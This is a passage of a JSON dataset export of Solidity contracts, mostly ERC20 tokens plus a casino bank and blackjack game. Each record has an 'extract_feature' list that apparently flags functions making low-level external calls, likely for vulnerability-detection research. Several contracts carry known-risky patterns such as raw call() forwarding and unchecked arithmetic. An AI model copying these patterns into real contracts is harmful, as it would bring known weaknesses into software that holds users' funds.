names[msg.sender] = _name;\n }\n function nameOf(address _owner) constant public returns (bytes32) {\n return names[_owner];\n }\n function claimBeer() payable {\n require(msg.value == .015 ether);\n balances[msg.sender] += 1;\n totalSupply += 1;\n require(totalSupply <= maxSupply);\n RECIPIENT.transfer(msg.value);\n Transfer(address(0), msg.sender, 1);\n LogBeerBought(now, msg.sender);\n }\n function() payable {\n claimBeer();\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb151c"
  },
  "filename": "33739.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = \"StakeIt\";\n decimals = 8;\n symbol = \"STAKE\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb151d"
  },
  "filename": "33742.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n uint256 public initialAmount = 360000000 * (10 ** 18);\n string tokenName = \"Oneroot Network Token\";\n uint8 decimalUnits =18;\n string tokenSymbol=\"RNT\";\n function HumanStandardToken() {\n balances[msg.sender] = initialAmount;\n totalSupply = initialAmount;\n name = tokenName;\n decimals = decimalUnits;\n symbol = tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb151e"
  },
  "filename": "33745.sol",
  "content": "pragma solidity ^0.4.17;\ncontract token {\n function transferFrom(address sender, address receiver, uint amount) public returns(bool success) {}\n function transfer(address receiver, uint amount) public returns(bool success) {}\n function balanceOf(address holder) public constant returns(uint) {}\n}\ncontract owned {\n address public owner;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function owned() public{\n owner = msg.sender;\n }\n function changeOwner(address newOwner) onlyOwner public{\n owner = newOwner;\n }\n}\ncontract safeMath {\n function safeSub(uint a, uint b) constant internal returns(uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) constant internal returns(uint) {\n uint c = a + b;\n assert(c >= a && c >= b);\n return c;\n }\n function safeMul(uint a, uint b) constant internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n}\ncontract casinoBank is owned, safeMath{\n uint public playerBalance;\n mapping(address=>uint) public balanceOf;\n mapping(address=>uint) public withdrawAfter;\n uint public gasPrice = 20;\n token edg;\n uint public closeAt;\n event Deposit(address _player, uint _numTokens, bool _chargeGas);\n event Withdrawal(address _player, address _receiver, uint _numTokens);\n function casinoBank(address tokenContract) public{\n edg = token(tokenContract);\n }\n function deposit(address receiver, uint numTokens, bool chargeGas) public isAlive{\n require(numTokens > 0);\n uint value = safeMul(numTokens,10000);\n if(chargeGas) value = safeSub(value, msg.gas/1000 * gasPrice);\n assert(edg.transferFrom(msg.sender, address(this), numTokens));\n balanceOf[receiver] = safeAdd(balanceOf[receiver], value);\n playerBalance = safeAdd(playerBalance, value);\n Deposit(receiver, numTokens, chargeGas);\n }\n function requestWithdrawal() public{\n withdrawAfter[msg.sender] = now + 7 minutes;\n }\n function cancelWithdrawalRequest() public{\n withdrawAfter[msg.sender] = 0;\n }\n function withdraw(uint amount) public keepAlive{\n require(withdrawAfter[msg.sender]>0 && now>withdrawAfter[msg.sender]);\n withdrawAfter[msg.sender] = 0;\n uint value = safeMul(amount,10000);\n balanceOf[msg.sender]=safeSub(balanceOf[msg.sender],value);\n playerBalance = safeSub(playerBalance, value);\n assert(edg.transfer(msg.sender, amount));\n Withdrawal(msg.sender, msg.sender, amount);\n }\n function withdrawBankroll(uint numTokens) public onlyOwner {\n require(numTokens <= bankroll());\n assert(edg.transfer(owner, numTokens));\n }\n function bankroll() constant public returns(uint){\n return safeSub(edg.balanceOf(address(this)), playerBalance/10000);\n }\n function close() onlyOwner public{\n if(playerBalance == 0) selfdestruct(owner);\n if(closeAt == 0) closeAt = now + 30 days;\n else if(closeAt < now) selfdestruct(owner);\n }\n function open() onlyOwner public{\n closeAt = 0;\n }\n modifier isAlive {\n require(closeAt == 0);\n _;\n }\n modifier keepAlive {\n if(closeAt > 0) closeAt = now + 30 days;\n _;\n }\n}\ncontract casinoProxy is casinoBank{\n mapping(address => bool) public authorized;\n mapping(address => mapping(address => bool)) public authorizedByUser;\n mapping(address => mapping(address => uint8)) public lockedByUser;\n address[] public casinoGames;\n mapping(address => uint) public count;\n modifier onlyAuthorized {\n require(authorized[msg.sender]);\n _;\n }\n modifier onlyCasinoGames {\n bool isCasino;\n for (uint i = 0; i < casinoGames.length; i++){\n if(msg.sender == casinoGames[i]){\n isCasino = true;\n break;\n }\n }\n require(isCasino);\n _;\n }\n function casinoProxy(address authorizedAddress, address blackjackAddress, address tokenContract) casinoBank(tokenContract) public{\n authorized[authorizedAddress] = true;\n casinoGames.push(blackjackAddress);\n }\n function shift(address player, uint numTokens, bool isReceiver) public onlyCasinoGames{\n require(authorizedByUser[player][msg.sender]);\n var gasCost = msg.gas/1000 * gasPrice;\n if(isReceiver){\n numTokens = safeSub(numTokens, gasCost);\n balanceOf[player] = safeAdd(balanceOf[player], numTokens);\n playerBalance = safeAdd(playerBalance, numTokens);\n }\n else{\n numTokens = safeAdd(numTokens, gasCost);\n balanceOf[player] = safeSub(balanceOf[player], numTokens);\n playerBalance = safeSub(playerBalance, numTokens);\n }\n }\n function withdrawFor(address receiver, uint amount, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized keepAlive{\n uint gasCost = msg.gas/1000 * gasPrice;\n var player = ecrecover(keccak256(receiver, amount, count[receiver]), v, r, s);\n count[receiver]++;\n uint value = safeAdd(safeMul(amount,10000), gasCost);\n balanceOf[player] = safeSub(balanceOf[player], value);\n playerBalance = safeSub(playerBalance, value);\n assert(edg.transfer(receiver, amount));\n Withdrawal(player, receiver, amount);\n }\n function setGameAddress(uint8 game, address newAddress) public onlyOwner{\n if(game<casinoGames.length) casinoGames[game] = newAddress;\n else casinoGames.push(newAddress);\n }\n function authorize(address addr) public onlyOwner{\n authorized[addr] = true;\n }\n function deauthorize(address addr) public onlyOwner{\n authorized[addr] = false;\n }\n function authorizeCasino(address playerAddress, address casinoAddress, uint8 v, bytes32 r, bytes32 s) public{\n address player = ecrecover(keccak256(casinoAddress,lockedByUser[playerAddress][casinoAddress],true), v, r, s);\n require(player == playerAddress);\n authorizedByUser[player][casinoAddress] = true;\n }\n function deauthorizeCasino(address playerAddress, address casinoAddress, uint8 v, bytes32 r, bytes32 s) public{\n address player = ecrecover(keccak256(casinoAddress,lockedByUser[playerAddress][casinoAddress],false), v, r, s);\n require(player == playerAddress);\n authorizedByUser[player][casinoAddress] = false;\n lockedByUser[player][casinoAddress]++;\n }\n function setGasPrice(uint8 price) public onlyOwner{\n gasPrice = price;\n }\n function move(uint8 game, bytes data, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized isAlive{\n require(game < casinoGames.length);\n var player = ecrecover(keccak256(data), v, r, s);\n require(withdrawAfter[player] == 0 || now<withdrawAfter[player]);\n assert(checkAddress(player, data));\n assert(casinoGames[game].call(data));\n }\n function checkAddress(address player, bytes data) constant internal returns(bool){\n bytes memory ba;\n assembly {\n let m := mload(0x40)\n mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, player))\n mstore(0x40, add(m, 52))\n ba := m\n }\n for(uint8 i = 0; i < 20; i++){\n if(data[16+i]!=ba[i]) return false;\n }\n return true;\n }\n}",
  "extract_feature": [
    "function move(uint8 game, bytes data, uint8 v, bytes32 r, bytes32 s) public onlyAuthorized isAlive{\nrequire(game < casinoGames.length);\nvar player = ecrecover(keccak256(data), v, r, s);\nrequire(withdrawAfter[player] == 0 || now<withdrawAfter[player]);\nassert(checkAddress(player, data));\nassert(casinoGames[game].call(data));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb151f"
  },
  "filename": "33746.sol",
  "content": "pragma solidity ^0.4.17;\ncontract owned {\n address public owner;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function owned() public{\n owner = msg.sender;\n }\n function changeOwner(address newOwner) onlyOwner public {\n owner = newOwner;\n }\n}\ncontract mortal is owned {\n function close() onlyOwner public{\n selfdestruct(owner);\n }\n}\ncontract casino is mortal{\n uint public minimumBet;\n uint public maximumBet;\n mapping(address => bool) public authorized;\n function casino(uint minBet, uint maxBet) public{\n minimumBet = minBet;\n maximumBet = maxBet;\n }\n function setMinimumBet(uint newMin) onlyOwner public{\n minimumBet = newMin;\n }\n function setMaximumBet(uint newMax) onlyOwner public{\n maximumBet = newMax;\n }\n function authorize(address addr) onlyOwner public{\n authorized[addr] = true;\n }\n function deauthorize(address addr) onlyOwner public{\n authorized[addr] = false;\n }\n modifier onlyAuthorized{\n require(authorized[msg.sender]);\n _;\n }\n}\ncontract blackjack is casino {\n uint8[13] cardValues = [11, 2, 3, 4, 5, 6, 7, 8, 9, 10, 10, 10, 10];\n mapping(bytes32 => bool) public over;\n mapping(bytes32 => uint) bets;\n mapping(bytes32 => uint8[]) splits;\n mapping(bytes32 => mapping(uint8 => bool)) doubled;\n event NewGame(bytes32 indexed id, bytes32 deck, bytes32 cSeed, address player, uint bet);\n event Result(bytes32 indexed id, address player, uint value, bool isWin);\n event Double(bytes32 indexed id, uint8 hand);\n event Split(bytes32 indexed id, uint8 hand);\n function blackjack(uint minBet, uint maxBet) casino(minBet, maxBet) public{\n }\n function initGame(address player, uint value, bytes32 deck, bytes32 srvSeed, bytes32 cSeed) onlyAuthorized public{\n assert(value >= minimumBet && value <= maximumBet);\n assert(!over[srvSeed]&&bets[srvSeed]==0);\n bets[srvSeed] = value;\n assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, value, false));\n NewGame(srvSeed, deck, cSeed, player, value);\n }\n function double(address player, bytes32 id, uint8 hand, uint value) onlyAuthorized public {\n require(!over[id]);\n require(checkBet(id, value));\n require(hand <= splits[id].length && !doubled[id][hand]);\n doubled[id][hand] = true;\n bets[id] += value;\n assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, value, false));\n Double(id, hand);\n }\n function split(address player, bytes32 id, uint8 hand, uint value) onlyAuthorized public {\n require(!over[id]);\n require(checkBet(id, value));\n require(splits[id].length < 3);\n splits[id].push(hand);\n bets[id] += value;\n assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, value, false));\n Split(id,hand);\n }\n function surrender(address player, bytes32 seed, uint bet) onlyAuthorized public {\n var id = keccak256(seed);\n require(!over[id]);\n over[id] = true;\n if(bets[id]>0){\n assert(bets[id]==bet);\n assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player,bet / 2, true));\n Result(id, player, bet / 2, true);\n }\n else{\n assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player,bet / 2, false));\n Result(id, player, bet / 2, false);\n }\n }\n function stand(address player, uint8[] deck, bytes32 seed, uint8[] numCards, uint8[] splits, bool[] doubled,uint bet, bytes32 deckHash, bytes32 cSeed) onlyAuthorized public {\n bytes32 gameId;\n gameId = keccak256(seed);\n assert(!over[gameId]);\n assert(splits.length == numCards.length - 1);\n over[gameId] = true;\n assert(checkDeck(deck, seed, deckHash));\n var (win,loss) = determineOutcome(deck, numCards, splits, doubled, bet);\n if(bets[gameId] > 0){\n assert(checkBet(gameId, bet));\n win += bets[gameId];\n }\n else\n NewGame(gameId, deckHash, cSeed, player, bet);\n if (win > loss){\n assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, win-loss, true));\n Result(gameId, player, win-loss, true);\n }\n else if(loss > win){\n assert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, loss-win, false));\n Result(gameId, player, loss-win, false);\n }\n else\n Result(gameId, player, 0, false);\n }\n function checkDeck(uint8[] deck, bytes32 seed, bytes32 deckHash) constant public returns(bool correct) {\n if (keccak256(convertToBytes(deck), seed) != deckHash) return false;\n return true;\n }\n function convertToBytes(uint8[] byteArray) internal constant returns(bytes b) {\n b = new bytes(byteArray.length);\n for (uint8 i = 0; i < byteArray.length; i++)\n b[i] = byte(byteArray[i]);\n }\n function checkBet(bytes32 gameId, uint bet) internal constant returns (bool correct){\n uint factor = splits[gameId].length + 1;\n for(uint8 i = 0; i < splits[gameId].length+1; i++){\n if(doubled[gameId][i]) factor++;\n }\n return bets[gameId] == bet * factor;\n }\n function determineOutcome(uint8[] cards, uint8[] numCards, uint8[] splits, bool[] doubled, uint bet) constant public returns(uint totalWin, uint totalLoss) {\n var playerValues = getPlayerValues(cards, numCards, splits);\n var (dealerValue, dealerBJ) = getDealerValue(cards, sum(numCards));\n uint win;\n uint loss;\n for (uint8 h = 0; h < numCards.length; h++) {\n uint8 playerValue = playerValues[h];\n if (playerValue > 21){\n win = 0;\n loss = bet;\n }\n else if (numCards.length == 1 && playerValue == 21 && numCards[h] == 2 && !dealerBJ) {\n win = bet * 3 / 2;\n loss = 0;\n }\n else if (playerValue > dealerValue || dealerValue > 21){\n win = bet;\n loss = 0;\n }\n else if (playerValue == dealerValue){\n win = 0;\n loss = 0;\n }\n else{\n win = 0;\n loss = bet;\n }\n if (doubled[h]){\n win *= 2;\n loss *= 2;\n }\n totalWin += win;\n totalLoss += loss;\n }\n }\n function getPlayerValues(uint8[] cards, uint8[] numCards, uint8[] pSplits) constant internal returns(uint8[5] playerValues) {\n uint8 cardIndex;\n uint8 splitIndex;\n (cardIndex, splitIndex, playerValues) = playHand(0, 0, 0, playerValues, cards, numCards, pSplits);\n }\n function playHand(uint8 hIndex, uint8 cIndex, uint8 sIndex, uint8[5] playerValues, uint8[] cards, uint8[] numCards, uint8[] pSplits) constant internal returns(uint8, uint8, uint8[5]) {\n playerValues[hIndex] = cardValues[cards[cIndex] % 13];\n cIndex = cIndex < 4 ? cIndex + 2 : cIndex + 1;\n while (sIndex < pSplits.length && pSplits[sIndex] == hIndex) {\n sIndex++;\n (cIndex, sIndex, playerValues) = playHand(sIndex, cIndex, sIndex, playerValues, cards, numCards, pSplits);\n }\n uint8 numAces = playerValues[hIndex] == 11 ? 1 : 0;\n uint8 card;\n for (uint8 i = 1; i < numCards[hIndex]; i++) {\n card = cards[cIndex] % 13;\n playerValues[hIndex] += cardValues[card];\n if (card == 0) numAces++;\n cIndex = cIndex < 4 ? cIndex + 2 : cIndex + 1;\n }\n while (numAces > 0 && playerValues[hIndex] > 21) {\n playerValues[hIndex] -= 10;\n numAces--;\n }\n return (cIndex, sIndex, playerValues);\n }\n function getDealerValue(uint8[] cards, uint8 numCards) constant internal returns(uint8 dealerValue, bool bj) {\n uint8 card = cards[1] % 13;\n uint8 card2 = cards[3] % 13;\n dealerValue = cardValues[card] + cardValues[card2];\n uint8 numAces;\n if (card == 0) numAces++;\n if (card2 == 0) numAces++;\n if (dealerValue > 21) {\n dealerValue -= 10;\n numAces--;\n } else if (dealerValue == 21) {\n return (21, true);\n }\n uint8 i;\n while (dealerValue < 17) {\n card = cards[numCards + i + 2] % 13;\n dealerValue += cardValues[card];\n if (card == 0) numAces++;\n if (dealerValue > 21 && numAces > 0) {\n dealerValue -= 10;\n numAces--;\n }\n i++;\n }\n }\n function sum(uint8[] numbers) constant internal returns(uint8 s) {\n for (uint i = 0; i < numbers.length; i++) {\n s += numbers[i];\n }\n }\n}",
  "extract_feature": [
    "function initGame(address player, uint value, bytes32 deck, bytes32 srvSeed, bytes32 cSeed) onlyAuthorized public{\nassert(value >= minimumBet && value <= maximumBet);\nassert(!over[srvSeed]&&bets[srvSeed]==0);\nbets[srvSeed] = value;\nassert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, value, false));\nNewGame(srvSeed, deck, cSeed, player, value);\n}",
    "function double(address player, bytes32 id, uint8 hand, uint value) onlyAuthorized public {\nrequire(!over[id]);\nrequire(checkBet(id, value));\nrequire(hand <= splits[id].length && !doubled[id][hand]);\ndoubled[id][hand] = true;\nbets[id] += value;\nassert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, value, false));\nDouble(id, hand);\n}",
    "function split(address player, bytes32 id, uint8 hand, uint value) onlyAuthorized public {\nrequire(!over[id]);\nrequire(checkBet(id, value));\nrequire(splits[id].length < 3);\nsplits[id].push(hand);\nbets[id] += value;\nassert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, value, false));\nSplit(id,hand);\n}",
    "function surrender(address player, bytes32 seed, uint bet) onlyAuthorized public {\nvar id = keccak256(seed);\nrequire(!over[id]);\nover[id] = true;\nif(bets[id]>0){\nassert(bets[id]==bet);\nassert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player,bet / 2, true));\nResult(id, player, bet / 2, true);\n}\nelse{\nassert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player,bet / 2, false));\nResult(id, player, bet / 2, false);\n}\n}",
    "function stand(address player, uint8[] deck, bytes32 seed, uint8[] numCards, uint8[] splits, bool[] doubled,uint bet, bytes32 deckHash, bytes32 cSeed) onlyAuthorized public {\nbytes32 gameId;\ngameId = keccak256(seed);\nassert(!over[gameId]);\nassert(splits.length == numCards.length - 1);\nover[gameId] = true;\nassert(checkDeck(deck, seed, deckHash));\nvar (win,loss) = determineOutcome(deck, numCards, splits, doubled, bet);\nif(bets[gameId] > 0){\nassert(checkBet(gameId, bet));\nwin += bets[gameId];\n}\nelse\nNewGame(gameId, deckHash, cSeed, player, bet);\nif (win > loss){\nassert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, win-loss, true));\nResult(gameId, player, win-loss, true);\n}\nelse if(loss > win){\nassert(msg.sender.call(bytes4(keccak256(\"shift(address,uint256,bool)\")),player, loss-win, false));\nResult(gameId, player, loss-win, false);\n}\nelse\nResult(gameId, player, 0, false);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1520"
  },
  "filename": "33754.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract KameraToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n function KameraToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract Kamera is KameraToken(7000000000000000000000000, \"Kamera\", 18, \"KMR\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1521"
  },
  "filename": "33774.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1500000000000;\n totalSupply = 1500000000000;\n name = \"Zillionaire\";\n decimals = 2;\n symbol = \"ZLN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1522"
  },
  "filename": "33786.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() public constant returns (uint256 supply) {}\n function balanceOf(address _owner) public constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) public returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}\n function approve(address _spender, uint256 _value) public returns (bool success) {}\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Grimmjow8Token is StandardToken {\n function () public {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Grimmjow8Token() public {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Grimmjow8 Token\";\n decimals = 0;\n symbol = \"GRIMM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n 